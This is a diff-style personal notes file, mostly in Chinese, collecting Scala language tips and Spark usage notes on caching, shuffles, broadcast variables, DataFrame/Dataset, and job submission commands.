+13. apply() 和 update()方法
+  - 在 f(arg1, arg2, ...) 中，如果f不是函数或者方法，等价于 f.apply(arg1, arg2, ...)
+  - 如果 f(arg1, arg2, ...) 出现在等号的左侧，即 f(arg1, arg2, ...) = value, 则调用的是 f.update(arg1, arg2, ...)
+  - 示例
+    val scores = HashMap[String, Int]
+    scores("Bob") = 100 //调用的是scores.update("Bob", 100)
+    val bobScore = scores("Bob") //调用的是scores.apply("Bob")
+
+14. grouped() 和 mapValues() 操作
+  - 示例
+    val list = (1 to 10).toList
+    val gb: Map[Boolean, List[Int]] = list.groupBy(x => x > 5)
+    gb.mapValues(x => x.size) 等价于 gb.map(x => (x._1, x._2.size))
+    输出：(false,5) (true,5)
+
+15. 模式匹配中，常量与反引号的联系 P196
+  - 一般情况下，常量以大写字母开头，变量以小写字母开头，
+    在case语句中，如果有一个小写字母开头的常量，则需要将其包在反引号中。
+
+16. 在Scala的REPL中输入:help可以查看REPL支持的函数，
+  - 包括:load导入scala文件,:implicits -v查看隐式转换定义，等..
+
+17. Scala 下画图工具
+  - libraryDependencies += "org.scalanlp" % "breeze-viz_2.10" % "0.12"
+
+18. Java关于日期的操作？
+    import java.util.Date
+    import java.text.SimpleDateFormat
+    val ct = System.currentTimeMillis
+    val date = new Date(ct)
+    val sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
+    sf.format(date)
+
+    import java.util.Calendar
+    val cal = Calendar.getInstance
+    cal.setTime(new Date())
+    val sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
+    sf.format(cal.getTime)
+
+19. Scala中排序操作默认的都是从小到大(升序)排序。
+
+20. Make Scala JSR 223 compliant (类似JS中的eval()函数) http://days2010.scala-lang.org/node/138/146/
+    import scala.tools.nsc._
+    val n = new Interpreter(new Settings())
+    n.bind("label", "Int", new Integer(4))
+    n.interpret("println(2+label)")
+    // didn't event try to check success or error
+    n.close();
+
+21. 不可变的List与可变的ListBuffer  //http://www.tuicool.com/articles/V7nYZv
+    - var valueList: List[List[String]] = List()
+      newValue :: valueList
+      valueList.reverse
+    - val valueListBuffer: ListBuffer[List[String]] = ListBuffer()
+      valueListBuffer += newValue
+      valueListBuffer.toList
+    无论是运算速度还是内存占用的考虑，第一种方案List的实现要比第二种方案ListBuffer的实现要好。
+
+22. Unix和Windows的Scala脚本
+  - Unix, 新建helloarg文件，加入以下代码并chmod +x helloarg
+    #!/bin/sh
+    exec scala "$0" "$@"
+    !#
+    //对第一个参数打招呼
+    println("Hello, " + args(0) + "!")
+  - Windows, 新建helloarg.bat, 并加入以下内容
+    ::#!
+    @echo off
+    call scala %0 %*
+    goto :eof
+    ::!#
+    println("Hello, " + args(0) + "!")
+
+23. 验证for表达式或for循环是被Scala转译成map/flatMap/filter/foreach的
+    case class ForTest(i:Int)
+    for (a <- ForTest(5)) yield a + 3 //会报出error: value map is not a member of ForTest
+    for (a <- ForTest(5); if a < 2) yield a + 3  //会报出error: value filter is not a member of ForTest(实际上可能是withFilter)
+    (a <- ForTest(5); a<-ForTest(8)) yield a + 3 //会报出error: value flatMap is not a member of ForTest
+    // 给ForTest添加map()函数
+    case class ForTest(i:Int) { def map(f:Int=>Int) = f(i) }
+    for (a <- ForTest(5)) yield a + 3 //此时输出8
+
+24. TrieMap(并发字典树) //http://docs.scala-lang.org/zh-cn/overviews/parallel-collections/ctries.html
+  - 对于大多数并发数据结构，如果在遍历中途数据结构发生改变，都不保证遍历的一致性。实际上，大多数可变容器也都是这样。
+    并发字典树允许在遍历时修改Trie自身，从这个意义上来讲是特例。修改只影响后续遍历。
+  - val tm = scala.collection.concurrent.TrieMap[String, String]()
+    tm += ("a" -> "asdf")
+    tm -= "a"
+
+25. 换名调用: 本质上是参数列表为空的方法，而非函数。(P160)
+    因为：函数必须要有参数列表，而方法可以没有参数列表
+  - def until(condition: => Boolean)(block: => Unit)
+
+26. val map = mutable.Map[String, String]()
+    map += ("a" -> "asdf")
+    map("a") 相当于 map.get("a").get
+    map.getOrElse("a", "asdf")
+
+27. 生成随机数
+  - java.util.UUID.randomUUID.toString
+
+28. spray框架报出：could not find implicit value for parameter marshaller: spray.httpx.marshalling.ToResponseMarshaller[Unit]
+  - 原因是代码运行的结果无法被spray隐式转换为可返回的类型, case class、Map 或者 String 类型等
+
+29. scala中的柯里化在Python中使用如下方式实现
+    def concat_curry(fruit):
+      def perf_concat(veg):
+        return fruit + veg
+      return perf_concat
+
+30. scala: "1, $s, $s".format("2", "3")
+    python: "1, {}, {}".format("2", "3")
+
+31. 多维数组：
+    val multdim = Array.ofDim[Int](3, 4)
+    multdim(0)(2) = 15
+
+32. By-name参数 & By-value参数
+  http://blog.csdn.net/u010376788/article/details/50404087
+
+33. Scala中赋值操作是引用 
+由于scala中的所有的赋值操作都是引用操作而非值拷贝操作，当我们定义val paramB = paramA的时候，只是增加了一个b到a引用，而非将a的值在内存中拷贝了一份
+
+34. 注意下划线的指代
+	private def filesHere = (new java.io.File(".")).listFiles
+	def filesMatching(matcher: (String) => Boolean) = {
+		for (file <- filesHere; if matcher(file.getName)) yield file
+	}
+	def filesEnding(query: String) = filesMatching(_.endsWith(query))  // 下划线 _ 指代是什么？
+	def filesContaining(query: String) = filesMatching(_.contains(query))
+
+35. 迭代器遍历过一次后就变成空了
+	** 位置1 注释被放开后，outfile.txt 得不到预期的效果
+	** 原因：Source.fromFile() 方法返回的是一个 iterator 迭代器，迭代器中的数据只能取一次，取过一次后，iterator就清空了。
+	import scala.io.Source
+	import java.io._
+	val source = Source.fromFile("infile.txt", "utf-8")
+	//source.getLines().toBuffer.reverse.foreach(println) //位置1
+	val file = new File("outfile.txt")
+	val outFile = new PrintWriter(file)
+	val buff = source.getLines().toBuffer.reverse
+	buff.foreach(outFile.println(_))
+	outFile.close()
+	source.close()
+
+36. scala 读取系统环境变量
+	val dir = "./conf/"
+	val configHome = scala.util.Properties.envOrElse("VMAX_APP_CONFIG_HOME", dir) //Properties.envOrElse 读取环境变量
+
+37. scala 读取 .conf 配置文件
+	import com.typesafe.config.{Config, ConfigFactory}
+	val conf: Config = ConfigFactory.parseFile(new File(filename)) //file 为配置文件,放在 jar 包外的某个目录，比如 serviceaddress.conf
+	//或 val conf: Config = ConfigFactory.load(filename) //file 为配置文件,放在 jar 包内的某个目录，比如 /resources/xx.conf, 注意,不需要new File()
+
+	val sparkcorenum = config.getInt("sparkcorenum")
+	val sparkmemory = config.getString("sparkmemory").split("\\*").map(_.toInt).reduce(_*_)
+	val isParRun = config.getBoolean("isParRun")
+	val includeCondition = config.getStringList("includeCondition").toList  //需要 import scala.collection.JavaConversions._
+
+38. 访问URL，并返回结果
+	import akka.io.IO
+	def sendGetRequest(url: String) = {
+	    implicit val futureTimeout: Timeout = 60 minutes
+	    val checkRequest = Get(url)
+	    val resFuture = (IO(Http) ? checkRequest).mapTo[HttpResponse]
+	    Await.result(resFuture, 1000.seconds)
+	    implicit val formats = native.Serialization.formats(NoTypeHints)
+	    resFuture.value.get.get.message.entity.data.asString
+	}
+
+39. scala 文件下载, 使用 Java 代码
+
+40. 下载某url的html代码到本地file文件
+	def downloadUrlFile(url: String, file: String) = {
+		val pw = new PrintWriter(file)
+		pw.write(Source.fromURL(url, "utf-8").mkString)
+	}
+
+41. 
+	import scala.util.parsing.json.JSON
+	val jsonParse: Option[Any] = JSON.parseFull(HttpResponseString) //scala 中解析 Json 格式数据
+
+42. 区分整型与字符串的运算
+	val a = 1 * 10 + 5 + ""
+	a: String = 15 //先做数值运算，再转换为字符串
+	val b = "" + 1 * 10 + 5 
+	b: String = 105  //先转换为字符串，再对字符串进行运算或拼接
+
+43. 
+	List(2, 0, 3, 2, 4, 0, 3, 2, 3, 3).map(List(8, 2, 1, 0, 3))
+	相当于：List(2, 0, 3, 2, 4, 0, 3, 2, 3, 3).map(i => List(8, 2, 1, 0, 3)(i))
+	结果为：res6: List[Int] = List(1, 8, 0, 1, 3, 8, 0, 1, 0, 0)
+
+44. val arr = Array(...)
+    val Array(first, second, _*) = arr  // 变量声明中的模式, arr中的第一、第二个元素会被绑定到first、second中
+
+45. scala 并没有枚举类型，可以通过Enumeration助手类，或者密封类实现枚举类型
+  - Enumeration助手类
+    object TrafficLightColor extends Enumeration {
+      type TrafficLightColor = Value
+      val Red = Value(0, "Stop")
+      val Yellow = Value(10, "Hurry up")
+      val Green = Value("Go") //此时ID为11 
+    }
+    通过以下方式使用 
+      import TrafficLightColor._
+      if (color == Red) "stop"
+
+  - 密封类
+    sealed abstract class TrafficLightColor
+    case object Red extends TrafficLightColor
+    case object Yellow extends TrafficLightColor
+    case object Green extends TrafficLightColor
+
+    color match {
+      case Red => "stop"
+      case Yellow => "hurry up"
+      case Green => "go"
+    }
+
+46. 自定义List
+    abstract class LList[+T] { //Any Int => List[Any] List[Int]
+      def isEmpty: Boolean
+      def head: T
+      def tail: LList[T]
+
+      def ::[U >: T](elem: U): LList[U] = new ::(elem, this)
+
+      //def length(len: Int = 0): Int = if (isEmpty) len else tail.length(1 + len)
+      def length: Int = if (isEmpty) 0 else 1 + tail.length
+
+      def drop(n: Int): LList[T] =
+        if (isEmpty) Nil
+        else if (n <= 0) this
+        else tail.drop(n - 1)
+
+      //def map[U](f: T => U, newLList: LList[U] = Nil): LList[U] = if (isEmpty) newLList else tail.map(f, f(head) :: newLList)
+      def map[U](f: T => U): LList[U] =
+        if (isEmpty) Nil
+        else f(head) :: tail.map(f)
+
+      def foreach[U](f: T => U): Unit =
+        if (!isEmpty) {
+          f(head)
+          tail.foreach(f)
+        }
+
+      //如何递归实现？
+      def filter(f: T => Boolean): LList[T] = {
+        var result: LList[T] = Nil
+        for (elem <- this)
+          if (f(elem)) result = elem :: result
+        result
+      }
+    } /*LList End*/
+
+    class LListException(msg: String = "Unknown") extends Exception
+
+    object Nil extends LList[Nothing] {
+      def isEmpty = true
+      def head: Nothing = throw new LListException("no head")
+      def tail: LList[Nothing] = throw new LListException("no tail")
+    }
+
+    class ::[T](hd: T, tl: LList[T]) extends LList[T] {
+      def head = hd
+      def tail = tl
+      def isEmpty = false
+    }
+
+    // 折叠实现 (注：大多数的高阶函数都可以使用折叠来实现)
+    object LList {
+      // 从右边开始折叠，右边第一个值为foldRight的第一个参数Nil, 通过第二个参数的操作依次插入传入的值
+      def apply[T](elems: T*) = elems.foldRight(Nil: LList[T])(_ :: _)
+    }
+
+    // 构造方式一 (推荐)
+    val myList = LList("a", "b", "c")
+    // 构造方式二 (还行)
+    val myList = "a" :: "b" :: "c" :: Nil
+
+47. "New York".partition(_.isUpper)  //输出对偶("NY", "ew ork")
+
+48. 在REPL中，键入 :implicits 以查看所有除Predef外被引入的隐式成员；
+    键入 :implicits -v 以查看全部
+
+49. scalac -Xprint:type test.scala  //将会看到加入隐式转换后的源码
+
+50. implicitly函数在Predef.scala中定义：def implicitly[T](implicit e: T) = e
+    用于检查一个泛型的隐式对象是否存在，即从冥界中召唤隐式值
+    def foo[A](implicit x: Ordered[A]) {}
+    def foo[A : Ordered] {} 
+    implicitly[Ordering[Int]]
+
+51. "abc".map(_.toUpper)  //返回 res9: String = ABC
+    "abc".map(_.toInt)  //返回 scala.collection.immutable.IndexedSeq[Int] = Vector(97, 98, 99)
+
+52. 隐式转换与隐式参数
+    - implicit def int2Fraction(n: Int) = Fraction(n, 1)  //隐式转换
+    - implicit val quoteDelimiters = Delimiters("<", ">")  //类型为Delimiters的隐式值
+    - def quote(what: String)(implicit delims: Delimiters) = delims.left + what + delims.right  //delims是隐式参数
+    - def smaller[T](a: T, b: T)(implicit order: T => Ordered[T])  //order既是隐式参数也是隐式转换
+    - class Pair[T: Ordering]  //上下文界定，该代码要求存在一个类型为Ordering[T]的隐式值
+    - def firstLast[A, C](it: C)(implicit ev: C <:< Iterable[A]) = (it.head, it.last)  //类型证明，ev为类型证明对象，证明了C是Iterable[A]的子类型，因此C才存在C.head和C.last
+
+53. 类型参数
+    - class Pair[T, S, V](val first: T, val second: S): V  //泛型类。在类的定义中，可以用类型参数来定义变量，方法参数，以及返回值的类型 
+    - def getMiddle[T](a: Array[T]) = a(a.length / 2)  //泛型函数
+    - class Pair[T <: Comparable[T]](val first: T, val second: T) {
+        def smaller = if (first.compareTo(second) < 0) first else second
+      }  // <: 上界, T是Comparable[T]的子类型
+    - def replaceFirst[R >: T](newFirst: R) = new Pair[R](newFirst, second)  // >: 下界， R是T的超类型
+    - class Pair[T <% Comparable[T]]  // <% 视图界定，意味着 T 可以被隐式转换成Comparable[T]
+    - def makePair[T: Manifest](first: T, second: T) {  //Manifest上下文界定，用于让编译器在运行时保存参数类型的信息
+        val r = new Array[T](2)
+        r(0) = first
+        r(1) = second
+        r
+      }
+      等价于
+      def makePair[T](first: T, second: T)(implicit ev: Manifest) { ... }
+    - 类型约束
+      T =:= U  //将测试T是否等于
+      T <:< U  //T是否为U的子类型
+      T <%< U  //T是否能隐式转换为U
+
+54. 型变
+    - 输入适用逆变
+    - 输出适用协变
+    - 在函数参数中，型变是反转过来的--它的参数是协变的，如
+      foldLeft[B](z: B)(op: (B, A) => B): B
+                     -       +  +     -   +
+      op是foldLeft的参数，也是一个函数，即函数参数，型变是反转的。
+
+55. 高级类型
+    - 单例类型
+    - 类型投影
+    - 类型别名
+    - 结构类型
+    - 复合类型
+    - 自身类型
+    - 依赖注入
+    - 抽象类型
+    - 中置类型
+    - 存在类型
+
+56. e.getStackTrace.toString 与 e 的区别
+
+57. reify函数可以查看代码的运行过程
+    import reflect.runtime.universe._
+    reify{val a = 1}
+
+58. p.isInstanceOf[Employee]  //包含子类对象的检查
+    p.getClass == classOf[Employee]  //不包含子类对象的检查，即若p指向Employee的子类则会返回false
+    最好的做法是使用模式匹配：
+    p match {
+      case s: Employee => ...
+      case _ => ...
+    }
+
+59. 只有主构造器可以调用超类的构造器
+    class Employee(name: String, age: Int, val salary: Double) extends Person(name, age)
+    name 和 age 参数会被传递给超类 Person.
+
+    相当于Java代码：
+    public class Employee extends Person {
+      private double salary;
+      public Employee(String name, int age, double salary) {
+        super(name, age);
+        this.salary = salary;
+      }
+    }
+
+60. 重写字段
+    - def 只能重写另一个def
+    - val 只能重写另一个val或不带参数的def
+    - var 只能重写另一个抽象的var
+
+61. 在子类中使用提前定义语法：(「提前定义」可以在超类的构造器执行之前初始化子类的val字段)
+    class Ant extends {
+      override val range = 2
+    } with Creature  //此处的range为Creature的val字段
+
+62. 特质
+    - 被继承的特质中的字段，只是简单地被加到了子类当中，而不是被继承
+      原因是：JVM中，一个类只能扩展一个超类，因此来自特质的字段不能以相同的方式继承
+      因此，当特质改变时，所有混入了特质的类都必须重新编译(这是让特质拥有了具体行为的代价)
+    - 构造(顺序)
+      > 特质构造器在超类构造器之后、类构造器之前执行
+      > 特质由左到右被构造
+      > 其方法先被执行的特质排在更后面
+
+63. 用return语句从一个匿名函数中返回值给包含这个匿名函数的带名函数
+    scala中return语句的实现是通过抛出特殊异常而实现，注意：若被try()代码块所包裹，则不能获取输所预期的结果
+    若需要使用return，则需要给出其返回类型。
+
+64. def runInThread(block: () => Unit) {...}
+    def runInThread(block: => Unit) {...}  //换名调用，block为参数为空的方法(函数的参数列表不能为空)
+
+65. 斐波那契数列
+    lazy val fib: Stream[BigInt] = 1 #:: 2 #:: (fib zip fib.tail map { case (x, y) => x + y})
+    fib.take(5).foreach(println)  //打印前5个值
+    - val list = List(1, 2, 3, 4, 5)
+      list.zip(list.tail)
+      结果为：res18: List[(Int, Int)] = List((1,2), (2,3), (3,4), (4,5))  //相邻的两个元素两两组成元组
+
+66. 模式匹配中的warning: non-variable type argument Set[Int] in type pattern (Set[Int], Int) is unchecked since it is eliminated by erasure
+    val suppdata = Array((Set(5), 1.0), (Set(3), 1.0))
+    suppdata.map(_ match{case a:Tuple2[Any,Any] => a._1})
+    res92: Array[Any] = Array(Set(5), Set(3))
+
+    suppdata.map(_ match{case a:Tuple2[Set[Int],Int] => a._1})
+    <console>:48: warning: non-variable type argument Set[Int] in type pattern (Set[Int], Int) is unchecked since it is eliminated by erasure
+    res93: Array[Set[Int]] = Array(Set(5), Set(3))
+
+    suppdata.map(_ match{case a:Tuple2[Set[Int] @unchecked,Int @unchecked] => a._1})
+    res94: Array[Set[Int]] = Array(Set(5), Set(3))
+
+    suppdata.map(_ match{case a:Tuple2[_,_] => a._1 match{ case b:Set[_] => b}})
+    res95: Array[scala.collection.immutable.Set[_]] = Array(Set(5), Set(3))
+
+    suppdata.map(_ match{case a:Tuple2[_,_] => a._1 match{ case b:Set[_] => b.asInstanceOf[Set[Int]]}})
+    res96: Array[Set[Int]] = Array(Set(5), Set(3))
+
+67. 自身类型与简单继承之间的区别：
+    简单继承关系：class SuperA extends Basic {}
+    自身类型：
+    class SuperA 
+      this: Basic => {}
+    - note：自身类型中SuperA并不是Basic的子类，只是表明this必定是一个Basic类型的对象
+    - 两种方式都可以通过 val obj = new SuperA with OtherBasic 进行把OtherBasic注入到SuperA中
+
+68. scala中的进程控制 (P111)
+    import sys.process._
+    "ls -al .." !
+
+
+--------------------------------------Scala End-----------------------------------------
+
+--------------------------------------Spark Begin-----------------------------------------
+
+1. 缓存策略
+  rdd.cache() 等价于 rdd.persist(StorageLevel.MEMORY_ONLY)
+  StorageLevel.MEMORY_ONLY            //默认的，将RDD存储为未序列化的Java对象，
+                                        当Spark估计内存不够存放一个分区时，Spark干脆不存放，在下次调用时重新计算。
+  StorageLevel.MEMORY_ONLY_SER        //将RDD存储为序列化的Java对象，比MEMORY_ONLY方式更省存储空间，但更消耗对CPU的操作
+  StorageLevel.MEMORY_AND_DISK        //将RDD存储为未序列化的Java对象，当内存不够用时，溢写到磁盘中
+  StorageLevel.MEMORY_AND_DISK_SER    //与MEMORY_ONLY类似
+  
+  持久化策略选择次序应该：MEMORY_ONLY > MEMORY_ONLY_SER > MEMORY_AND_DISK_SER
+  
+  通常不建议使用DISK_ONLY和后缀为_2的级别: 因为完全基于磁盘文件进行数据的读写，会导致性能急剧降低，有时还不如重新计算一次RDD。
+  后缀为_2的级别，必须将所有数据都复制一份副本，并发送到其他节点上，数据复制以及网络传输会导致较大的性能开销，除非是要求作业的高可用性，否则不建议使用。
+
+2. API操作
+  - def map[U](f: (T) => U)(implicit arg0: ClassTag[U]): RDD[U]
+  - def mapPartitions[U](f: (Iterator[T]) => Iterator[U], preservesPartitioning: Boolean = false)(implicit arg0: ClassTag[U]): RDD[U]
+  - def mapPartitionsWithIndex[U](f: (Int, Iterator[T]) => Iterator[U], preservesPartitioning: Boolean = false)(implicit arg0: ClassTag[U]): RDD[U]
+  map的输入函数是应用于RDD中每个元素。
+  mapPartitions是map的一个变种,mapPartitions函数的输入函数是应用于每个分区，也就是把每个分区中的内容作为整体来处理的。
+  mapPartitionsWithIndex函数作用同mapPartitions，不过提供了两个参数，第一个参数为分区的索引。
+
+  - def countByValue()(implicit ord: Ordering[T] = null): Map[T, Long] 
+  Return the count of each unique value in this RDD as a local map of (value, count) pairs.
+  Note that this method should only be used if the resulting map is expected to be small, as the whole thing is loaded into the driver's memory. To handle very large results, consider using rdd.map(x => (x, 1L)).reduceByKey(_ + _), which returns an RDD[T, Long] instead of a map.
+  小数据集中适用countByValue()，因为countByValue()函数会把结果集都加载到Driver的内存中；
+  当大数据量时，应使用rdd.map(x => (x, 1L)).reduceByKey(_ + _)。
+
+3. Spark中有两种共享变量：广播变量 & 累加器 
+  广播变量
+  - 背景：Spark执行一个Stage时，会为待执行函数建立闭包(即Stage所有任务所需信息的二进制形式)，
+    Spark把这个闭包发送到集群的每个Executor上。
+  - 场景：当许多任务需要访问同一个(不可变)数据结构时，应该使用广播变量。
+  - 作用：(只传输一次，并缓存为Java对象，从而避免了多次传输的IO操作及反序列化的操作)
+    > 在每个Executor上将数据缓存为原始的Java对象(即每个Executor进行一次反序列化)，这样就不用为每个任务执行反序列化；
+    > 在多个Job和Stage之间缓存数据。
+  - 示例：
+    val dict = ...
+    val bDict = sc.broadcast(dict)
+  - 非广播变量 -- Task级别
+    广播变量 -- Executor级别(不过是只读的)
+
+  累加器
+  - 示例：
+    val accumulatorValue = SparkContext.accumulator(initialValue)
+  - 从Task的角度看，累加器是一个只写的变量，不能访问累加器的值
+    累加器的值只有在Driver中可以访问
+  - 自定义累加器，需扩展AccumulatorParam, 但该操作需要同时满足交换律和结合律
+    object UniqParam extends AccumulableParam[HashSet[Long], Long] {
+      override def zero(initValue: HashSet[Long]) = initValue
+      // For adding new values
+      override def addAccumulator(r: HashSet[Long], t: Long): HashSet[Long] = {
+        r += t
+        r
+      }
+      // For merging accumulators
+      override def addInPlace(r1: HashSet[Long], r2: HashSet[Long]):
+          HashSet[Long] = {
+        r1 ++ r2
+      }
+    }
+  - Spark accumulators with the "new" V2 APIs
+    http://spark.apache.org/docs/latest/programming-guide.html#accumulators
+    https://github.com/high-performance-spark/high-performance-spark-examples/blob/master/src/main/scala/com/high-performance-spark-examples/transformations/NewAccumulators.scala
+
+4. 在Spark SQL shell 中使用 show create table xxtable 可以打印出xxtable的建表脚本
+
+5. Spark SQL中，重新构建分区信息
+  msck repair table xxtablename;
+
+6. Cache & CheckPoint
+  - Cache: rdd.cache()，相当于rdd.persist(StorageLevel.MEMORY_ONLY)
+    在该Job中第一个partition被计算时，检查是否需要cache,若需要则把该Job中的所有partition cache到「内存」中
+  - CheckPoint: rdd.checkpoint()
+    需要等待该Job完全完成后，另外启动专门的Job去完成checkpoint，也就是该Job会计算两次。
+   一般地，在使用rdd.checkpoint()的时候，建议加上rdd.cache()，这样第二次运行的Job就不用再去计算该rdd了。
+  - 区别：3点区别
+    cache: 在第一个partion(task)被计算前检查，缓存在内存中，会保存lineage(computing chain)关系
+    checkpoint: 在整个job完成后启动专门的job完成操作，缓存在磁盘中，不会保存lineage信息
+  - checkpoint 与 rdd.persist(StorageLevel.DISK_ONLY) 区别：生命周期的差异
+    checkpoint 将rdd持久化到HDFS或本地文件夹中，如果不手动remove，将一直存在，可以被下一个Driver program使用。
+    rdd.persist(StorageLevel.DISK_ONLY) 会被缓存在磁盘中，该partition有blockManager管理，一旦Driver program执行结束，blockManager会被stop，所缓存的rdd也会被清空。
+
+7. spark 中文资料
+  https://github.com/JerryLead/SparkInternals/blob/master/markdown/2-JobLogicalPlan.md
+
+8. RDD.toDebugString 可以看到整个logical plan(RDD的数据依赖关系)
+  RDD.getParents
+
+9. - 谁创建sc, 谁是Driver
+   - Executor是执行Job的容器
+   - 每一个Action动作触发一个Job
+   - Job下会启动多个task
+   - 不同的task归属不同的stage, 有两种stage: 
+    ShuffleMapTask -> ?
+    ResultTask -> ?
+
+10. Shuffle操作
+  - 如果rdd的某个操作所需的数据分散在不同的partition里面，此时则需要shuffle操作。
+    shuffle操作要求数据类型是<k, v>(这里的k不能是Array等集合类型)，如果原始数据只有key, 那么需要补充成<key, null>, shuffle完后还原为key
+  - Operations which can cause a shuffle include 
+    'repartition' operations like 「repartition」 and 「coalesce」, 
+    'ByKey' operations (except for counting) like 「groupByKey」 and 「reduceByKey」, 
+    and 'join' operations like 「cogroup」 and 「join」.
+  - 不同的操作的组装方式影响不同的shuffle的数量和shuffler数据的数量，
+    shuffler是一个很昂贵的操作，所有的数据必须落盘然后再通过网络传输，
+    repatition,join,cogroup和别的一些以*key和*bykey结尾的transformation操作都会导致shuffle, 但是性能是不一样的。
+    > 当执行一个associative reductive 操作时不要使用groupbykey,
+      rdd.groupbykey().mapValues(_.sum)和rdd.reduceBykey(_+_)的结果一样，
+      但是前面的操作会导致所有的数据进行网络传输，后者只会先在本地计算每个patition相同key的和，然后通过shuffler合并所有本地计算的和(都会有shuffle,但是传输的数据减少了很多)
+    > 当输入和输出的类型不一样时不要使用reduceByKey
+      当写一个transformation用来找到每一个key对应唯一的一个字符串是，
+      一种方式如下：rdd.map(kv => (kv._1, new Set[String]() + kv._2)).reduceByKey(_ ++ _)，该操作会导致大量的不必要的set对象，每个key都会创建一个;
+      这里最好使用aggregateBykey，它会执行map端的聚集更有效,
+      val zero = new collection.mutable.Set[String]()
+      rdd.aggregateByKey(zero)(
+        (set, v) => set += v,
+        (set1, set2) => set1 ++= set2)
+    > 不要使用flatMap-join-groupBy的模式。当两个数据集已经groupbykey后，如果想join后继续分组，可以使用cogroup
+      That avoids all the overhead associated with unpacking and repacking the groups.
+
+11. rdd.coalesce(number, shuffle = true/false)
+  coalesce()可以将parent rdd的partition个数进行调整，比如从5个减少到3个，或者从5个增加到10个；
+  shuffle参数决定是否发生shuffle的操作，且当shuffle=true时，不能增加partition的个数。
+  rdd.coalesce(10, shuffle=true) 等价于 rdd.repartition(10) 此时每个partition平均分所有的record
+
+12. stage划分：
+  从后往前推算，遇到ShuffleDependency就断开，遇到NarrowDependency就将其加入该stage。
+  每个stage里面task的数目由该stage最后一个RDD中的partition个数决定。
+  因为是从后往前推算，因此最后一个stage的id是0，stage 1和stage 2都是stage 0的parents
+
+13. 不管是1:1还是N:1的NarrowDependency,只要是NarrowDependency chain，就可以进行pipeline,
+  生成的task个数与该stage最后一个RDD的partition个数相同。
+  
+14. Broadcast
+	- HttpBroadcase
+	- TorrentBroadcase
+
+15. 逻辑视图：rdd运算过程中的数据依赖关系，以及简单API背后的复杂计算逻辑和数据依赖关系
+	物理视图：task, stage 的划分, 以及job的生成
+
+16. scala quasiquotes 2.11版本，一个可以把字符串解析成语法树的工具
+	http://docs.scala-lang.org/overviews/quasiquotes/intro.html
+
+17. spark sql 注册 UDF
+	create temporary function customEncrypt as 'com.zte.bigdata.api.udf.customEncrypt';
+
+18. spark-13485
+	Spark1.3提出DataFrame,Spark1.6提出Dataset,在Spark2.0把DataFrame定义为Dataset[Row]
+	原因是发现有些RDD的逻辑无法使用DataFrame表达，比如要对group by或join后的结果用自定义的函数，可能用SQL是无法表达的。
+	而，DataSet API扩展DataFrame API 支持静态类型和运行已经存在的Scala或Java语言的用户自定义函数，同时DataSet也能享受Spark SQL里所有性能带来的提升。
+	因此在是使用Spark API时，优先选择DataFrame 或 DataSet类型，而非RDD API。
+
+19. RDD & DataFrame & DataSet
+	RDD
+	只读的，是Java对象的集合，类型安全，在编译期间检查类型是否正确
+	缺点：序列化与反序列化的开销大，GC开销大
+
+	RDD是分布式的Java对象的集合。DataFrame是分布式的Row对象的集合。DataFrame除了提供了比RDD更丰富的算子以外，更重要的特点是提升执行效率、减少数据读取以及执行计划的优化，比如filter下推、裁剪等
+
+	dataframe 不是类型安全的，在编译期间不会检查类型是否正确,不是面向对象风格。 //http://blog.csdn.net/wo334499/article/details/51689549
+	dataset 是dataframe的一种特例，主要区别是Dataset每一个record存储的是一个强类型值而不是一个Row。 http://www.jianshu.com/p/c0181667daa0
+	dataset 是类型安全的，在编译期间检查类型是否正确，和RDD一样是面向对象风格。并且比RDD具有运算速度更快、内存消耗更少的优势。
+	dataframe 和 dataset 可以相互转化：df.as[ElementType] ，ds.toDF()
+
+	dataframe 编程风格，非面向对象的风格
+	// Load a text file and interpret each line as a java.lang.String
+	val ds = sqlContext.read.text("/home/spark/1.6/lines").as[String]
+	val result = ds
+	  .flatMap(_.split(" "))               // Split on whitespace
+	  .filter(_ != "")                     // Filter empty words
+	  .toDF()                              // Convert to DataFrame to perform aggregation / sorting
+	  .groupBy($"value")                   // Count number of occurences of each word ， 不是面向对象的编程方式
+	  .agg(count("*") as "numOccurances")
+	  .orderBy($"numOccurances" desc)      // Show most common words first
+	  
+	dataset 编程风格，面向对象的风格
+	//DataSet,完全使用scala编程，不要切换到DataFrame
+	val wordCount = 
+	  ds.flatMap(_.split(" "))
+	    .filter(_ != "")
+	    .groupBy(_.toLowerCase()) // Instead of grouping on a column expression (i.e. $"value") we pass a lambda function
+	    .count()
+		
+	dataset 官方介绍: https://databricks.com/blog/2016/01/04/introducing-apache-spark-datasets.html
+
+20. Structured Streaming
+	在Spark 2.0，使用基于DataFrame/Dataset开发离线计算和流式计算的程序，而非DStream，这样可以得到性能的提升。
+
+21. Spark SQL会自动优化 where 条件的查询语句，分区字段写在where的最前面和最后面的效果的差不多的。
+	上述结论利用了现场HDFS中的 BlockMissingException 进行了验证。
+
+22. // Linux 命令与 spark 操作相结合, 如实现批量导出数据到新表，查询某些表的信息的。
+	cat empty_tables.txt | grep "day" | xargs -I {} echo "insert into table 0627_{} select * from {} where p_date > '2016-06-19' limit 500;" | /home/mr/spark/bin/beeline -u jdbc:hive2://zdh240:18000 -n mr > insert_empty_day_table_data.txt 2>&1
+
+23. 元数据jar提交命令
+	/home/mr/spark/bin/spark-submit 
+    --class com.zte.vmax.metadata.Coordinator 
+    --master spark://zdh234:7077 
+    --driver-memory 10G 
+    --driver-java-options "-Xss8M -Xmx20480m -Xms2048m -XX:MaxPermSize=10240m" 
+    --executor-memory 15G  
+    --total-executor-cores 60  
+    --conf spark.ui.port=0  
+    --files  /home/mr/testly/submitSparkAppFile/ict_function_dpi_hour/ict_function_dpi_hour.json  
+    --jars /home/mr/testly/api/feature/antennacheck/algorithm/antennacheck_0.0.1.jar  
+    /home/mr/testly/commonjar/metadata-coordinator_1.1.10-SNAPSHOT.jar 
+    --config ict_function_dpi_hour.json 
+    /home/mr/testly/submitSparkAppFile/ict_function_dpi_hour/meta_result31_ict_function_dpi_hour_1_zdh235.json  
+    2> /home/mr/testly/submitSparkAppFile/ict_function_dpi_hour/meta_result31_ict_function_dpi_hour_1_zdh235.json.log 1>&2
+
+24. 开发过程中，能避免则尽可能避免使用reduceByKey、join、distinct、repartition等会进行shuffle的算子，尽量使用map类的非shuffle算子。
+	这样的话，没有shuffle操作或者仅有较少shuffle操作的Spark作业，可以大大减少性能开销。
+
+//Spark内存表
+25. cache table xx_name as select ... from ...; (会创建临时表)
